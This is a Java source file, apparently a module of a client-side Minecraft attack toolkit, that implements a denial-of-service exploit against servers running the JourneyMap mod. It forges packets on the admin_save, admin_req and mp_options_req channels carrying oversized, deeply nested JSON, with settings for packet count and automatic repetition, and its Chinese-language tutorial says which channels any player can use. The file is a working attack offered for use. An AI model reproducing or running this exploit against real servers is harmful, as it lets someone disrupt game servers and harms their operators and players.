package com.redblue.red.modules.journeymap;

import com.redblue.red.core.AttackModule;
import com.redblue.red.core.config.ConfigParam;
import com.redblue.red.util.PacketForge;
import net.minecraft.client.Minecraft;
import net.minecraft.resources.ResourceLocation;
import net.minecraftforge.fml.ModList;

import java.util.List;

/**
 * JM-05: DoS via oversized string payloads
 *
 * Verified via javap:
 *   Multiple packets accept strings up to 32767 chars (sipush 32767 in m_130136_).
 *   - admin_save: 2x writeUtf (dimension + payload)
 *   - admin_req:  2x writeUtf (dimension + payload)
 *   - mp_options_req: 1x writeUtf (payload)
 *
 * No rate limiting on any channel. Server must:
 *   1. Decode UTF-8 strings from network buffer
 *   2. Parse JSON via Gson
 *   3. Attempt property load
 *
 * Deeply nested JSON amplifies CPU cost.
 * admin_save requires canServerAdmin OR isClient (LAN bypass).
 * admin_req with viewOnlyServerProperties=true allows any player.
 * mp_options_req requires allowMultiplayerSettings != NONE.
 */
public class JM05_DoS implements AttackModule {

    private static final ResourceLocation CH_ADMIN_SAVE =
        new ResourceLocation("journeymap", "admin_save");
    private static final ResourceLocation CH_ADMIN_REQ =
        new ResourceLocation("journeymap", "admin_req");
    private static final ResourceLocation CH_MP_OPTIONS =
        new ResourceLocation("journeymap", "mp_options_req");
    private static final int DISCRIMINATOR = 0;

    private long lastTickTime = 0;

    private final List<ConfigParam> params = List.of(
        ConfigParam.ofBool("enabled", "启用", false),
        ConfigParam.ofBool("confirm_danger",
            "确认: 可能导致服务器卡顿", false),
        ConfigParam.ofEnum("channel", "攻击频道", "ADMIN_REQ",
            "ADMIN_REQ", "ADMIN_SAVE", "MP_OPTIONS"),
        ConfigParam.ofInt("string_size", "字符串长度", 32000, 1000, 32767),
        ConfigParam.ofInt("nesting_depth", "JSON嵌套深度", 500, 1, 2000),
        ConfigParam.ofInt("packet_count", "单次发包数", 1, 1, 20),
        ConfigParam.ofBool("auto_repeat", "自动重复", false),
        ConfigParam.ofInt("interval", "重复间隔(tick)", 5, 1, 200)
            .visibleWhen("auto_repeat", "true")
    );

    @Override public String id() { return "jm05_dos"; }
    @Override public String name() { return "JSON解析DoS"; }
    @Override public String description() {
        return "发送超大/深嵌套JSON载荷消耗服务器CPU";
    }

    @Override
    public String getTutorial() {
        return "[使用方法]\n"
            + "1. 选择攻击频道\n"
            + "2. 调整字符串长度和嵌套深度\n"
            + "3. 勾选确认复选框\n"
            + "4. 点击执行或开启自动重复\n\n"
            + "[频道说明]\n"
            + "ADMIN_REQ: viewOnlyServerProperties=true时任意玩家可用\n"
            + "ADMIN_SAVE: 需要admin权限或LAN服务器\n"
            + "MP_OPTIONS: 需要allowMultiplayerSettings!=NONE\n\n"
            + "[注意]\n"
            + "低危漏洞, 效果取决于服务器性能\n"
            + "字符串上限32767字符(协议限制)";
    }

    @Override
    public boolean isAvailable() {
        return ModList.get().isLoaded("journeymap");
    }

    @Override
    public List<ConfigParam> getConfigParams() { return params; }

    @Override
    public void execute(Minecraft mc) {
        if (mc.player == null) return;
        boolean confirmed = getParam("confirm_danger")
            .map(ConfigParam::getBool).orElse(false);
        if (!confirmed) return;

        int count = getParam("packet_count")
            .map(ConfigParam::getInt).orElse(1);
        for (int i = 0; i < count; i++) {
            sendPayload();
        }
    }

    @Override
    public void tick(Minecraft mc) {
        if (mc.player == null || mc.level == null) return;
        boolean autoRepeat = getParam("auto_repeat")
            .map(ConfigParam::getBool).orElse(false);
        if (!autoRepeat) return;
        boolean confirmed = getParam("confirm_danger")
            .map(ConfigParam::getBool).orElse(false);
        if (!confirmed) return;

        int interval = getParam("interval")
            .map(ConfigParam::getInt).orElse(5);
        long now = mc.level.getGameTime();
        if (now - lastTickTime < interval) return;
        lastTickTime = now;

        int count = getParam("packet_count")
            .map(ConfigParam::getInt).orElse(1);
        for (int i = 0; i < count; i++) {
            sendPayload();
        }
    }

    private void sendPayload() {
        String channel = getParam("channel")
            .map(ConfigParam::getString).orElse("ADMIN_REQ");
        int size = getParam("string_size")
            .map(ConfigParam::getInt).orElse(32000);
        int depth = getParam("nesting_depth")
            .map(ConfigParam::getInt).orElse(500);

        String payload = buildNestedJson(size, depth);

        switch (channel) {
            case "ADMIN_SAVE":
                sendAdminSave(payload);
                break;
            case "MP_OPTIONS":
                sendMpOptions(payload);
                break;
            default: // ADMIN_REQ
                sendAdminReq(payload);
                break;
        }
    }

    private void sendAdminReq(String payload) {
        PacketForge.send(CH_ADMIN_REQ, buf -> {
            buf.writeByte(DISCRIMINATOR);
            buf.writeByte(0x2A);
            buf.writeInt(1); // GLOBAL
            buf.writeUtf("");
            buf.writeUtf(payload);
        });
    }

    private void sendAdminSave(String payload) {
        PacketForge.send(CH_ADMIN_SAVE, buf -> {
            buf.writeByte(DISCRIMINATOR);
            buf.writeByte(0x2A);
            buf.writeInt(1); // GLOBAL
            buf.writeUtf("");
            buf.writeUtf(payload);
        });
    }

    private void sendMpOptions(String payload) {
        PacketForge.send(CH_MP_OPTIONS, buf -> {
            buf.writeByte(DISCRIMINATOR);
            buf.writeByte(0x2A);
            buf.writeUtf(payload);
        });
    }

    private String buildNestedJson(int maxSize, int depth) {
        StringBuilder sb = new StringBuilder(maxSize);
        // Build deeply nested JSON: {"a":{"a":{"a":...}}}
        int openCount = 0;
        for (int i = 0; i < depth && sb.length() < maxSize - depth - 10; i++) {
            sb.append("{\"a\":");
            openCount++;
        }
        sb.append("1");
        for (int i = 0; i < openCount; i++) {
            sb.append('}');
        }
        // Pad remaining space with harmless JSON
        while (sb.length() < maxSize) {
            sb.append(' ');
        }
        if (sb.length() > maxSize) {
            sb.setLength(maxSize);
        }
        return sb.toString();
    }
}
